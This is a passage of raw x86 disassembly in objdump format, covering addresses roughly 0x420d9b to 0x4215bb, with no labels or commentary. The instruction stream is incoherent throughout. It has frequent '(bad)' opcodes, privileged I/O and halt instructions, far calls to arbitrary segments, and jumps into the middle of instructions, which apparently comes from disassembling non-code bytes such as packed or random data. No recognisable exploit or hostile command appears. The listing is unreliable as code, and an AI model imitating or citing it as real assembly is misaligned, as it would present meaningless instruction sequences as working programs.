  420d9b:	mov    esp,0xc33a8e3c
  420da0:	(bad)  
  420da1:	pushf  
  420da2:	cmp    DWORD PTR [ecx],ebp
  420da4:	adc    eax,0xe25311f9
  420da9:	xchg   edi,eax
  420daa:	sub    ebx,DWORD PTR [edx-0x1cae9380]
  420db0:	jmp    0x420d5e
  420db2:	shl    BYTE PTR [ebx-0x44fc711f],0x9f
  420db9:	(bad)  
  420dbb:	lahf   
  420dbc:	adc    DWORD PTR [ebx+0x42],ebp
  420dbf:	or     al,0x58
  420dc1:	mov    ds:0xc91419aa,al
  420dc6:	add    eax,0xa29735c2
  420dcb:	dec    edi
  420dcc:	icebp  
  420dcd:	add    al,0x19
  420dcf:	dec    edi
  420dd0:	in     al,dx
  420dd1:	lock mov ecx,0xd6434414
  420dd7:	mov    al,0xb0
  420dd9:	xchg   edx,eax
  420dda:	ds cwde 
  420ddc:	sti    
  420ddd:	xchg   esi,eax
  420dde:	mov    al,ds:0x4b72a772
  420de3:	dec    eax
  420de4:	xchg   edx,eax
  420de5:	int3   
  420de6:	(bad)  
  420de7:	fld    TBYTE PTR [ebp-0x3d]
  420dea:	sub    bl,BYTE PTR [esi+0x41]
  420ded:	enter  0x2567,0xbb
  420df1:	(bad)  
  420df2:	mov    ch,0x4d
  420df4:	push   ecx
  420df5:	enter  0xbd73,0x37
  420df9:	jnp    0x420d9b
  420dfb:	xchg   DWORD PTR [edi+0x71],ebp
  420dfe:	fld    DWORD PTR [edx+edi*8+0x3e2d7ecb]
  420e05:	and    eax,0x75affc83
  420e0a:	icebp  
  420e0b:	inc    ebp
  420e0c:	mov    eax,ds:0x1ec3bc36
  420e11:	or     al,0xe7
  420e13:	lds    ebp,FWORD PTR [esi+ebx*2+0x25]
  420e17:	aam    0xa5
  420e19:	mov    BYTE PTR ds:0x8294ce7f,bl
  420e1f:	mov    ah,0x0
  420e21:	outs   dx,DWORD PTR ds:[esi]
  420e22:	and    ebx,ebp
  420e24:	stc    
  420e25:	xchg   ebp,eax
  420e26:	leave  
  420e27:	bound  esp,QWORD PTR [ecx]
  420e29:	cmp    cl,BYTE PTR [ebp-0x60]
  420e2c:	inc    esi
  420e2d:	sbb    BYTE PTR [ecx+0x6839e3b3],bh
  420e33:	out    dx,eax
  420e34:	push   eax
  420e35:	rol    DWORD PTR [ebx],1
  420e37:	mov    al,ds:0x128622b7
  420e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e3d:	adc    BYTE PTR [edi-0x4ba805be],bl
  420e43:	adc    cl,bl
  420e45:	xlat   BYTE PTR ds:[ebx]
  420e46:	xchg   edx,eax
  420e47:	into   
  420e48:	sub    DWORD PTR [ebx],esi
  420e4a:	pop    ebp
  420e4b:	dec    esp
  420e4c:	xchg   ebp,eax
  420e4d:	in     al,0xd7
  420e4f:	inc    esp
  420e50:	cmp    BYTE PTR ds:0xcaee2635,al
  420e56:	pop    ecx
  420e57:	rcl    DWORD PTR ds:0x49213b99,cl
  420e5d:	xor    al,0x99
  420e5f:	bound  ebx,QWORD PTR [edx+0x35cb0e33]
  420e65:	xor    dh,cl
  420e67:	and    al,0xd0
  420e69:	xchg   ecx,eax
  420e6a:	pop    ds
  420e6b:	adc    BYTE PTR [ebx+eax*4+0x7da4d0c5],0xb4
  420e73:	push   eax
  420e74:	retf   0xc3a4
  420e77:	stos   BYTE PTR es:[edi],al
  420e78:	mov    al,0x8
  420e7a:	sbb    eax,0xa964c22d
  420e7f:	es and eax,0xf0dc661b
  420e85:	mov    ch,0xb9
  420e87:	pop    esi
  420e88:	pop    ebx
  420e89:	adc    edx,DWORD PTR [edx]
  420e8b:	jb     0x420ee6
  420e8d:	std    
  420e8e:	jl     0x420e75
  420e90:	fnstcw WORD PTR [esi+0x13]
  420e93:	aam    0xdf
  420e95:	push   edi
  420e96:	outs   dx,DWORD PTR ds:[esi]
  420e97:	or     eax,0x2e0af2c5
  420e9c:	leave  
  420e9d:	inc    edx
  420e9e:	and    BYTE PTR [ebp+0x3c],0x65
  420ea2:	xchg   ecx,eax
  420ea3:	repz adc al,0xc5
  420ea6:	push   ecx
  420ea7:	jb     0x420e5c
  420ea9:	push   ds
  420eaa:	and    BYTE PTR [eax+ecx*8],ah
  420ead:	lods   eax,DWORD PTR ds:[esi]
  420eae:	adc    eax,0x9135d107
  420eb3:	leave  
  420eb4:	jo     0x420e43
  420eb6:	cwde   
  420eb7:	cmp    esp,DWORD PTR [edx-0x56]
  420eba:	xchg   ecx,eax
  420ebb:	sbb    ebx,DWORD PTR [eax]
  420ebd:	in     al,0xa1
  420ebf:	push   es
  420ec0:	ss inc edx
  420ec2:	rcr    DWORD PTR [edi+0x73],0x63
  420ec6:	fs repnz int 0xf2
  420eca:	hlt    
  420ecb:	pop    esi
  420ecc:	arpl   WORD PTR [edx-0x74dcea],bp
  420ed2:	call   0x9436:0xdc244812
  420ed9:	sub    esp,DWORD PTR [ebp+0x605f91d8]
  420edf:	cdq    
  420ee0:	iret   
  420ee1:	(bad)  
  420ee2:	(bad)  
  420ee3:	pop    ebp
  420ee4:	inc    eax
  420ee5:	jle    0x420eb0
  420ee7:	mov    edx,0xb4131933
  420eec:	xor    al,0x12
  420eee:	add    edi,DWORD PTR [ebx]
  420ef0:	(bad)  
  420ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef2:	adc    bl,BYTE PTR [edx]
  420ef4:	loopne 0x420ea1
  420ef6:	dec    edx
  420ef7:	sti    
  420ef8:	mov    eax,0x65e241b
  420efd:	adc    BYTE PTR [esi+eiz*1+0x58],0x2d
  420f02:	scas   eax,DWORD PTR es:[edi]
  420f03:	aas    
  420f04:	call   0xd064:0xf12b02e8
  420f0b:	in     al,0x41
  420f0d:	scas   al,BYTE PTR es:[edi]
  420f0e:	jmp    0x420eda
  420f10:	in     eax,0x47
  420f12:	jg     0x420ea4
  420f14:	adc    ecx,DWORD PTR [eax]
  420f16:	in     al,0xe
  420f18:	sbb    BYTE PTR [ebp+0x16c4fc9],bl
  420f1e:	mov    eax,0x5ce962e
  420f23:	fucomip st,st(0)
  420f25:	mov    edx,0x40e4fb59
  420f2a:	retf   0x6b18
  420f2d:	adc    eax,0x72138020
  420f32:	mov    eax,ds:0x1bd43929
  420f37:	test   eax,0x5d7f30d1
  420f3c:	add    al,0x32
  420f3e:	pop    esi
  420f3f:	sub    eax,0x29c429d7
  420f44:	stos   BYTE PTR es:[edi],al
  420f45:	jge    0x420f11
  420f47:	int    0xc6
  420f49:	popf   
  420f4a:	cmp    dh,bl
  420f4c:	sbb    edi,DWORD PTR [ebx+0x3f411cba]
  420f52:	arpl   WORD PTR [edx-0x6c924a41],dx
  420f58:	sbb    al,0xeb
  420f5a:	mov    edi,0xa21ee10c
  420f5f:	or     eax,0x55b13d6e
  420f64:	and    ecx,edi
  420f66:	icebp  
  420f67:	jo     0x420fd3
  420f69:	dec    edx
  420f6a:	ins    BYTE PTR es:[edi],dx
  420f6b:	aam    0xa7
  420f6d:	sbb    DWORD PTR [edi+0x4c2c427e],ecx
  420f73:	inc    edi
  420f74:	mov    ecx,DWORD PTR [edx]
  420f76:	xor    al,0xbc
  420f78:	out    dx,al
  420f79:	out    0x69,eax
  420f7b:	imul   eax,DWORD PTR [ecx],0x8cc73dcc
  420f81:	cmp    esp,eax
  420f83:	push   0x585dd0df
  420f88:	aas    
  420f89:	mov    edi,0x4a29ae77
  420f8e:	pop    esp
  420f8f:	mov    dl,0xd7
  420f91:	mov    bh,0x59
  420f93:	jmp    0xb70fba5c
  420f98:	pop    edi
  420f99:	pop    edi
  420f9a:	nop
  420f9b:	test   BYTE PTR [ecx+eiz*1-0x4e7f85a2],0xc4
  420fa3:	jecxz  0x420f39
  420fa5:	jo     0x420fbc
  420fa7:	sub    BYTE PTR [eax-0x31],al
  420faa:	not    DWORD PTR [edi+edi*8-0x1daee149]
  420fb1:	and    ah,0xa5
  420fb4:	add    DWORD PTR [ebx],0xffffffc6
  420fb7:	ss cmc 
  420fb9:	mov    ebp,DWORD PTR [ebx-0x39]
  420fbc:	push   ebx
  420fbd:	aam    0x8e
  420fbf:	rol    BYTE PTR [edx],0x8c
  420fc2:	mov    esp,0x929117d4
  420fc7:	mov    eax,0x49ce1e3c
  420fcc:	and    al,0x34
  420fce:	xchg   esp,eax
  420fcf:	sar    BYTE PTR [ecx+0x44],1
  420fd2:	call   FWORD PTR [ecx+0xa]
  420fd5:	xchg   ecx,eax
  420fd6:	repz jnp 0x420f97
  420fd9:	in     al,dx
  420fda:	sbb    DWORD PTR [edx],0x4d58504a
  420fe0:	mov    ch,0x45
  420fe2:	sub    BYTE PTR [ecx+0x2a7f38a6],dh
  420fe8:	and    esi,edi
  420fea:	das    
  420feb:	mov    ecx,0x668c60c
  420ff0:	cmp    DWORD PTR [edx+0x133690a9],edx
  420ff6:	jecxz  0x421043
  420ff8:	push   esi
  420ff9:	pop    ebp
  420ffa:	scas   al,BYTE PTR es:[edi]
  420ffb:	add    al,dl
  420ffd:	fyl2x  
  420fff:	into   
  421000:	outs   dx,DWORD PTR ds:[esi]
  421001:	mov    fs,WORD PTR [edi]
  421003:	push   ss
  421004:	ss hlt 
  421006:	(bad)  
  421008:	sbb    eax,0xcd16e48b
  42100d:	je     0x420ff6
  42100f:	repz jae 0x42108b
  421012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421013:	gs ret 0x649a
  421017:	jle    0x42105e
  421019:	out    0xd,eax
  42101b:	stc    
  42101c:	cld    
  42101d:	cdq    
  42101e:	pop    ebx
  42101f:	repnz cmp BYTE PTR es:[ebx],0x6f
  421024:	(bad)  
  421025:	xor    cl,BYTE PTR ds:0x8719cfb4
  42102b:	ret    
  42102c:	xchg   edi,eax
  42102d:	push   cs
  42102e:	inc    esp
  42102f:	mov    ds:0x8d596775,eax
  421034:	loopne 0x42108e
  421036:	push   ebx
  421037:	retf   
  421038:	mov    bh,ah
  42103a:	int    0xb6
  42103c:	pop    ebp
  42103d:	push   ss
  42103e:	or     DWORD PTR [edi-0xf],0xffffff9d
  421042:	push   ebx
  421043:	and    al,0xdd
  421045:	repnz fmul QWORD PTR ds:0x115f8857
  42104c:	jmp    0x564b95e5
  421051:	push   ecx
  421052:	or     al,BYTE PTR [edi]
  421054:	ror    ebp,cl
  421056:	dec    eax
  421057:	cmp    bl,ch
  421059:	inc    esi
  42105a:	mov    DWORD PTR [edx-0x1],ecx
  42105d:	(bad)  
  42105e:	std    
  42105f:	sbb    bl,bl
  421061:	lahf   
  421062:	mov    esp,0xb0701e34
  421067:	mov    ch,0x9c
  421069:	add    BYTE PTR [eax-0x68231a43],bh
  42106f:	fild   DWORD PTR ds:0xb4123b27
  421075:	ins    BYTE PTR es:[edi],dx
  421076:	jae    0x4210bc
  421078:	sahf   
  421079:	xor    al,0xff
  42107b:	mov    es,ebp
  42107d:	pushw  0x75f6
  421081:	jle    0x4210c7
  421083:	lods   al,BYTE PTR ds:[esi]
  421084:	stc    
  421085:	lock mov edx,0x22c889b1
  42108b:	sub    al,0x24
  42108d:	ficomp DWORD PTR [esi]
  42108f:	xchg   DWORD PTR ds:0xafd2bd99,ebp
  421095:	ret    0x412d
  421098:	mov    eax,ds:0x5dff3777
  42109d:	pusha  
  42109e:	jmp    0xe121:0xb9ab549a
  4210a5:	out    0xc7,eax
  4210a7:	outs   dx,BYTE PTR ds:[esi]
  4210a8:	sbb    eax,0x2a8f77a6
  4210ad:	sbb    al,0x7d
  4210af:	inc    esp
  4210b0:	sbb    dh,BYTE PTR [ecx-0x494a186d]
  4210b6:	sub    DWORD PTR [edx],0x208d5392
  4210bc:	xlat   BYTE PTR ds:[ebx]
  4210bd:	mov    dh,BYTE PTR [esi+0x24bd2af8]
  4210c3:	mov    ah,0x57
  4210c5:	imul   ebx,DWORD PTR [ebx+0x11da6602],0xd831ccc6
  4210cf:	dec    ecx
  4210d0:	sbb    ebx,DWORD PTR [eax-0x30878e14]
  4210d6:	shl    BYTE PTR [edx-0xd],cl
  4210d9:	add    ch,al
  4210db:	push   ds
  4210dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210dd:	stos   BYTE PTR es:[edi],al
  4210de:	ja     0x421129
  4210e0:	test   BYTE PTR [ecx-0x4b],0x75
  4210e4:	pop    eax
  4210e5:	shr    BYTE PTR [ebx],1
  4210e7:	sbb    al,0xa6
  4210e9:	dec    esp
  4210ea:	mov    ebx,0x27208f18
  4210ef:	addr16 pop esp
  4210f1:	outs   dx,BYTE PTR ds:[esi]
  4210f2:	mov    ah,0x60
  4210f4:	ins    BYTE PTR es:[edi],dx
  4210f5:	arpl   WORD PTR [eax-0x728c360b],di
  4210fb:	call   0xead5789c
  421100:	ror    DWORD PTR ds:0x49aa80d6,0x7b
  421107:	aas    
  421108:	(bad)  
  421109:	out    dx,al
  42110a:	or     bh,BYTE PTR [esi+0x46f9e7e7]
  421110:	rcr    WORD PTR [ebx+0x11d05f83],cl
  421117:	loope  0x421130
  421119:	xchg   edi,eax
  42111a:	mov    bl,BYTE PTR [edx-0xe548fdd]
  421120:	push   cs
  421121:	mov    ch,0x7a
  421123:	cld    
  421124:	mov    dh,0xdc
  421126:	dec    esi
  421127:	loopne 0x421158
  421129:	dec    eax
  42112a:	pop    edx
  42112b:	add    eax,0xc2b7583b
  421130:	not    BYTE PTR [eax-0x5e]
  421133:	mov    edx,0xc4f579db
  421138:	and    eax,0xc1afc8a4
  42113d:	adc    cl,dh
  42113f:	add    BYTE PTR [eax],ch
  421141:	sub    al,0xa5
  421143:	dec    esi
  421144:	xor    esp,DWORD PTR [eax]
  421146:	push   esp
  421147:	cmp    ah,BYTE PTR [edx+0x64390e91]
  42114d:	call   0xe78d827e
  421152:	sar    DWORD PTR [eax+0x5e],cl
  421155:	pop    edx
  421156:	js     0x4210fc
  421158:	or     edi,DWORD PTR [ebx-0x666f8a4a]
  42115e:	adc    DWORD PTR [edi+0x37611d73],esp
  421164:	pop    esi
  421165:	fs retf 0xf1c9
  421169:	inc    ecx
  42116a:	imul   esi,DWORD PTR [eax-0x77ee4ffc],0x13
  421171:	pavgb  mm1,QWORD PTR [eax]
  421174:	mov    eax,ds:0x3e66f5a3
  421179:	in     eax,dx
  42117a:	push   edi
  42117b:	cld    
  42117c:	imul   eax,DWORD PTR [esi],0x33cc2b68
  421182:	aaa    
  421183:	adc    al,0xc4
  421185:	push   0x76c206f4
  42118a:	sbb    dl,BYTE PTR [ecx-0x12dd2bc2]
  421190:	hlt    
  421191:	inc    ecx
  421192:	jmp    0xc429e9f2
  421197:	into   
  421198:	pop    eax
  421199:	sub    ah,BYTE PTR [ebx]
  42119b:	(bad)  
  42119c:	and    BYTE PTR ds:0xf242dcc,bh
  4211a2:	mov    ebx,0x951379a2
  4211a7:	mov    esp,0xcc7d6e1e
  4211ac:	fwait
  4211ad:	int    0x93
  4211af:	jle    0x4211f5
  4211b1:	test   DWORD PTR [edx+0x33],ebp
  4211b4:	xor    eax,0xe207eb57
  4211b9:	retf   
  4211ba:	shl    ch,1
  4211bc:	shl    ch,0x2d
  4211bf:	sbb    edx,0xd22fff38
  4211c5:	mov    ebp,0x53dc93de
  4211ca:	les    eax,FWORD PTR [ebp-0x5bd959ad]
  4211d0:	xchg   ebx,eax
  4211d1:	jecxz  0x421178
  4211d3:	stc    
  4211d4:	xchg   BYTE PTR [ebx+edi*4+0x41e3c489],al
  4211db:	inc    esp
  4211dc:	add    ebp,DWORD PTR [esi]
  4211de:	pusha  
  4211df:	retf   0x6541
  4211e2:	mov    ds:0x298b89be,al
  4211e7:	jle    0x421220
  4211e9:	inc    edi
  4211ea:	mov    cs,WORD PTR [edi]
  4211ec:	dec    edx
  4211ed:	mov    edi,0x32a679e
  4211f2:	rcl    BYTE PTR [edi-0x3d55c549],0xe7
  4211f9:	pusha  
  4211fa:	sub    BYTE PTR [esi],dl
  4211fc:	inc    esp
  4211fd:	or     BYTE PTR [ecx+0x1b],dh
  421200:	in     eax,0xd4
  421202:	lahf   
  421203:	fadd   st,st(3)
  421205:	add    edi,DWORD PTR [ecx]
  421207:	jne    0x4211bf
  421209:	xor    edx,DWORD PTR [edi]
  42120b:	into   
  42120c:	imul   ebp,DWORD PTR [esi+esi*4],0xb40d6d54
  421213:	(bad)  
  421214:	xor    al,0x60
  421216:	mov    eax,DWORD PTR [ecx+0x41bf7e29]
  42121c:	cli    
  42121d:	inc    ecx
  42121e:	clc    
  42121f:	xchg   ebp,eax
  421220:	jmp    0x4211aa
  421222:	xchg   esi,eax
  421223:	fs sahf 
  421225:	fs push ecx
  421227:	mov    eax,ds:0x12a56429
  42122c:	xchg   esi,eax
  42122d:	(bad)  
  42122e:	aaa    
  42122f:	push   ds
  421230:	(bad)
  421233:	mul    DWORD PTR [esi+esi*4-0x2fa06271]
  42123a:	jl     0x421256
  42123c:	imul   esi,ecx,0x52d80a66
  421242:	pop    eax
  421243:	pop    eax
  421244:	jl     0x421248
  421246:	(bad)  
  421247:	pop    ebx
  421248:	shl    al,0xc9
  42124b:	test   BYTE PTR [edx+0x2b],al
  42124e:	push   esi
  42124f:	push   edx
  421250:	xchg   ebx,eax
  421251:	(bad)  
  421252:	cmp    BYTE PTR [eax],ch
  421254:	inc    ecx
  421255:	rcl    edi,cl
  421257:	repz jno 0x421211
  42125a:	outs   dx,DWORD PTR ds:[esi]
  42125b:	mov    dl,0x32
  42125d:	jbe    0x4211ee
  42125f:	add    al,0x4a
  421261:	ds call 0xb3baba9b
  421267:	repnz shl eax,1
  42126a:	lahf   
  42126b:	out    dx,eax
  42126c:	test   eax,0x8af744db
  421271:	sbb    al,0xe7
  421273:	sbb    DWORD PTR gs:0x169e7a83,eax
  42127a:	lds    ebp,FWORD PTR [edi-0xa]
  42127d:	in     al,0x71
  42127f:	imul   ecx,DWORD PTR [esi+0x6b],0xffffffcd
  421283:	add    cl,ch
  421285:	push   ecx
  421286:	rcl    ebp,1
  421288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421289:	jle    0x42123e
  42128b:	pop    esp
  42128c:	inc    edx
  42128d:	stos   DWORD PTR es:[edi],eax
  42128e:	mov    esp,0x9555f8f6
  421293:	out    dx,eax
  421294:	dec    ebp
  421295:	lock ins BYTE PTR es:[edi],dx
  421297:	mov    bh,0xf5
  421299:	and    BYTE PTR [ecx-0x58],dh
  42129c:	jp     0x421315
  42129e:	inc    eax
  42129f:	push   0x16
  4212a1:	(bad)  
  4212a2:	adc    al,0xca
  4212a4:	push   ds
  4212a5:	test   BYTE PTR [ecx],ch
  4212a7:	fsub   DWORD PTR [ebx]
  4212a9:	lahf   
  4212aa:	outs   dx,DWORD PTR ds:[esi]
  4212ab:	inc    ebp
  4212ac:	imul   ebx,esi,0x3429c496
  4212b2:	pop    ss
  4212b3:	out    0x9d,al
  4212b5:	mov    ch,0xf
  4212b7:	rcl    ebx,1
  4212b9:	cmp    BYTE PTR [edx],dl
  4212bb:	gs dec eax
  4212bd:	retf   0x1cde
  4212c0:	popf   
  4212c1:	sbb    DWORD PTR [ecx+eiz*4+0x71],edx
  4212c5:	int3   
  4212c6:	or     DWORD PTR [eax],0x50
  4212c9:	sub    eax,0x772b97ea
  4212ce:	dec    ebp
  4212cf:	inc    esp
  4212d0:	out    dx,eax
  4212d1:	imul   ebp,DWORD PTR [edx+0x60e53d1e],0x8fc6788b
  4212db:	popf   
  4212dc:	cli    
  4212dd:	dec    edi
  4212de:	mov    dl,0x3c
  4212e0:	out    0xe3,al
  4212e2:	stos   DWORD PTR es:[edi],eax
  4212e3:	imul   edi,DWORD PTR [di-0x4d],0x12
  4212e8:	mov    al,ds:0x900a2ec8
  4212ed:	mov    DWORD PTR [ecx],ebx
  4212ef:	inc    ebp
  4212f0:	adc    esi,ebx
  4212f2:	dec    edx
  4212f3:	dec    edx
  4212f4:	mov    eax,ds:0xd536c4e1
  4212f9:	sbb    BYTE PTR [ebx],0x86
  4212fc:	sub    al,0xee
  4212fe:	(bad)  
  4212ff:	mov    ds:0x7fab605f,eax
  421304:	push   cs
  421305:	mov    al,0x30
  421307:	and    ah,ah
  421309:	mov    ebp,0x42bc27b6
  42130e:	scas   eax,DWORD PTR es:[edi]
  42130f:	mov    DWORD PTR [esi+0x6167e075],eax
  421315:	dec    esi
  421316:	sbb    dl,dl
  421318:	mov    ebp,DWORD PTR [edi-0x38215b69]
  42131e:	xor    eax,0x8b88c5ca
  421323:	adc    BYTE PTR [edi],cl
  421325:	push   eax
  421326:	adc    al,0x93
  421328:	bound  esi,QWORD PTR [ebx-0x5c]
  42132b:	les    eax,FWORD PTR [esi+0x1666d402]
  421331:	xchg   ebp,eax
  421332:	es adc al,0xd8
  421335:	loop   0x42137a
  421337:	loop   0x421379
  421339:	pusha  
  42133a:	retf   0x9946
  42133d:	pop    ebp
  42133e:	std    
  42133f:	and    DWORD PTR cs:[esi-0x611c225],ecx
  421346:	and    eax,esi
  421348:	xor    ecx,ecx
  42134a:	and    cl,dh
  42134c:	mov    ebx,0x2d465df
  421351:	xchg   ebx,eax
  421352:	mov    edi,0x88bf805f
  421357:	jb     0x4213af
  421359:	dec    esp
  42135a:	ja     0x42132c
  42135c:	popa   
  42135d:	xchg   edi,eax
  42135e:	lods   eax,DWORD PTR ds:[esi]
  42135f:	rcl    BYTE PTR [ecx+0x69],0xe7
  421363:	(bad)  
  421364:	paddd  mm6,QWORD PTR [esp+eax*4+0x0]
  421369:	cmp    BYTE PTR [esi],0x72
  42136c:	addr16 in al,dx
  42136e:	cld    
  42136f:	push   edx
  421370:	imul   ebx,DWORD PTR [ebp-0x68d61764],0x6bffa66
  42137a:	inc    ebp
  42137b:	mov    WORD PTR [esi],fs
  42137d:	shr    DWORD PTR [edx+0x54a4f6f2],0x6
  421384:	lods   al,BYTE PTR ds:[esi]
  421385:	mov    WORD PTR [edi-0x50ff64d9],?
  42138b:	shl    DWORD PTR [ebx+0x2e],cl
  42138e:	dec    di
  421390:	retf   0xce56
  421393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421394:	test   eax,0xe0f57daa
  421399:	mov    BYTE PTR [edi+0x1914fa7c],al
  42139f:	xor    eax,0xdd58c90f
  4213a4:	pop    ebx
  4213a5:	mov    dl,BYTE PTR [eax-0x55b38be7]
  4213ab:	int    0x45
  4213ad:	(bad)  
  4213ae:	pop    ss
  4213af:	jae    0x421377
  4213b1:	clc    
  4213b2:	pusha  
  4213b3:	and    edi,DWORD PTR [edx+0x658683bf]
  4213b9:	pop    ss
  4213ba:	mov    dh,0xcf
  4213bc:	cwde   
  4213bd:	outs   dx,BYTE PTR ss:[esi]
  4213bf:	cmp    al,0xc3
  4213c1:	and    al,0x39
  4213c3:	add    ah,BYTE PTR [esi]
  4213c5:	repz jmp 0xb32f7d41
  4213cb:	mov    ds,WORD PTR [ecx]
  4213cd:	and    DWORD PTR [edx+eax*2-0x468867a3],ebx
  4213d4:	pop    esp
  4213d5:	xor    al,0x11
  4213d7:	xor    bl,BYTE PTR [esi+edx*1+0x14]
  4213db:	xchg   esp,eax
  4213dc:	adc    BYTE PTR [esi+ebp*2-0x58e645e3],dh
  4213e3:	call   0xd70b:0x65a30815
  4213ea:	adc    eax,0x26f4af4c
  4213ef:	add    al,0xea
  4213f1:	shl    DWORD PTR [eax+0x258182e5],0xf6
  4213f8:	lods   ax,WORD PTR ds:[esi]
  4213fa:	cmp    BYTE PTR [ebx+0x32ccb889],al
  421400:	or     bh,BYTE PTR [esp+edi*4+0x2579e6fa]
  421407:	or     eax,DWORD PTR ds:0xa609cdde
  42140d:	dec    esi
  42140e:	mov    ds:0x8e0d2b98,al
  421413:	dec    ebp
  421414:	test   BYTE PTR [ebx+ecx*8-0x5b],cl
  421418:	sub    eax,0xf3835c
  42141d:	retf   0xb47d
  421420:	(bad)  
  421421:	jmp    0x4213c7
  421423:	in     eax,dx
  421424:	rol    BYTE PTR [ecx-0x3c],1
  421427:	sub    DWORD PTR [esi+0x2c],esp
  42142a:	scas   eax,DWORD PTR es:[edi]
  42142b:	pop    esi
  42142c:	jge    0x421427
  42142e:	mov    ebx,0xf929bc
  421433:	ins    BYTE PTR es:[edi],dx
  421434:	dec    ebp
  421435:	hlt    
  421436:	fdivp  st(4),st
  421438:	(bad)  
  421439:	aad    0x80
  42143b:	dec    esi
  42143c:	mov    ebx,0x85a7630a
  421441:	and    edx,DWORD PTR [edx+0xb]
  421444:	lds    ecx,FWORD PTR [ecx-0x2f0f7c47]
  42144a:	pop    ebp
  42144b:	jp     0x4214c0
  42144d:	icebp  
  42144e:	dec    ebx
  42144f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421450:	inc    ebp
  421451:	inc    edi
  421452:	sub    eax,0x9ddae65
  421457:	and    BYTE PTR [ecx+0x7cba48b0],bl
  42145d:	imul   esp,DWORD PTR [edx],0x56650c98
  421463:	retf   
  421464:	mov    ecx,0x83f5daa5
  421469:	enter  0x58d4,0xe3
  42146d:	ja     0x4214dc
  42146f:	dec    ecx
  421470:	(bad)  
  421471:	push   ss
  421472:	sbb    ecx,ebp
  421474:	push   DWORD PTR [esi]
  421476:	push   DWORD PTR [edi+0x48]
  421479:	push   ecx
  42147a:	mov    esi,0xfafb3243
  42147f:	shl    BYTE PTR [ebx],cl
  421481:	lock dec eax
  421483:	enter  0xc9be,0x20
  421487:	cld    
  421488:	push   cs
  421489:	cmp    edx,edx
  42148b:	jle    0x421465
  42148d:	retf   0x8367
  421490:	inc    edi
  421491:	imul   edi,DWORD PTR [ebp+0x11606813],0xffffffa8
  421498:	mov    esi,0x9ae8dc5b
  42149d:	int3   
  42149e:	xchg   ebx,eax
  42149f:	sub    DWORD PTR [edx-0xc],0x4713ea85
  4214a6:	or     DWORD PTR [esi],edi
  4214a8:	mul    al
  4214aa:	jmp    0x4214fe
  4214ac:	call   0xe6bc:0x45bfcb3b
  4214b3:	icebp  
  4214b4:	(bad)  
  4214b6:	dec    esp
  4214b7:	xchg   BYTE PTR [edx+0x7dfc0d4c],al
  4214bd:	pop    es
  4214be:	sbb    eax,0x25ff74f4
  4214c3:	xchg   esi,eax
  4214c4:	pop    eax
  4214c5:	mov    al,ds:0xd5d0bfdf
  4214ca:	push   ebp
  4214cb:	lea    esi,[ecx-0x7c]
  4214ce:	fs dec eax
  4214d0:	mov    DWORD PTR [ecx+0x4b0ae961],ebp
  4214d6:	adc    DWORD PTR [edi],esi
  4214d8:	in     al,dx
  4214d9:	add    dl,BYTE PTR [esi-0x2559e196]
  4214df:	sub    eax,0x3eb6552
  4214e4:	sub    al,0xf1
  4214e6:	(bad)  
  4214e9:	push   ebp
  4214ea:	or     dl,BYTE PTR [ecx]
  4214ec:	and    ebx,DWORD PTR [edi-0xab505fd]
  4214f2:	sub    ch,BYTE PTR ds:0x6d7032ee
  4214f8:	and    BYTE PTR [ebx-0x37129968],dh
  4214fe:	xor    bl,BYTE PTR [edx-0x6090d269]
  421504:	dec    ecx
  421505:	pop    ecx
  421506:	stos   DWORD PTR es:[edi],eax
  421507:	jp     0x42155d
  421509:	inc    ebp
  42150a:	jge    0x42151a
  42150c:	ss pop ss
  42150e:	dec    ecx
  42150f:	call   0x567cf4d9
  421514:	push   es
  421515:	push   esp
  421516:	stc    
  421517:	push   ebx
  421518:	cmp    esp,DWORD PTR [edx-0x4]
  42151b:	xchg   ebx,eax
  42151c:	mov    edi,0x8860f696
  421521:	sbb    BYTE PTR [ebp+0x7408563f],0x78
  421528:	mov    dl,0xf2
  42152a:	retf   0xef5d
  42152d:	jl     0x4214de
  42152f:	mov    al,0xa0
  421531:	mov    BYTE PTR [esi],ah
  421533:	adc    bl,BYTE PTR [bx+di]
  421536:	xchg   ebp,eax
  421537:	push   ebp
  421538:	xor    al,0xdf
  42153a:	xchg   ebp,eax
  42153b:	fisttp DWORD PTR [eax]
  42153d:	int    0x3b
  42153f:	std    
  421540:	pop    ds
  421541:	jg     0x421510
  421543:	pop    edi
  421544:	lds    ebp,FWORD PTR [ecx+eiz*2+0x6d00f400]
  42154b:	retf   
  42154c:	adc    al,0xc8
  42154e:	sbb    eax,0xef23503f
  421553:	daa    
  421554:	mov    bh,0x5d
  421556:	or     bl,BYTE PTR [edx-0x7c]
  421559:	xlat   BYTE PTR ds:[ebx]
  42155a:	cmp    al,0x64
  42155c:	test   DWORD PTR [ebx],ebp
  42155e:	test   edi,esi
  421560:	std    
  421561:	jo     0x42153e
  421563:	mov    DWORD PTR [edx],ecx
  421565:	add    BYTE PTR [edx+eiz*2-0x71d843c9],dl
  42156c:	push   eax
  42156d:	rcl    DWORD PTR [eax],cl
  42156f:	ja     0x4215cf
  421571:	mov    BYTE PTR [esi+ecx*2-0x1bedcb4e],bl
  421578:	fidivr DWORD PTR [edx]
  42157a:	aaa    
  42157b:	or     bl,BYTE PTR [eax+0x58f255a6]
  421581:	mov    WORD PTR [edx+0x21d622bb],ds
  421587:	xchg   BYTE PTR [eax+ebp*4],bh
  42158a:	or     edi,edx
  42158c:	sub    eax,0x9b771b2c
  421591:	add    BYTE PTR [ecx-0x5583d24f],ah
  421597:	test   al,0xca
  421599:	xchg   ecx,eax
  42159a:	scas   eax,DWORD PTR es:[edi]
  42159b:	jo     0x42157a
  42159d:	aas    
  42159e:	test   al,0xde
  4215a0:	shl    BYTE PTR [edi+0x1a33b25c],cl
  4215a6:	iret   
  4215a7:	xchg   edx,eax
  4215a8:	and    ecx,DWORD PTR [ecx]
  4215aa:	jnp    0x421538
  4215ac:	jne    0x421599
  4215ae:	fsub   DWORD PTR [ebp-0x78]
  4215b1:	loop   0x42157b
  4215b3:	repz or al,ch
  4215b6:	mov    eax,ds:0xd6b1bfb
  4215bb:	ror    ecx,1
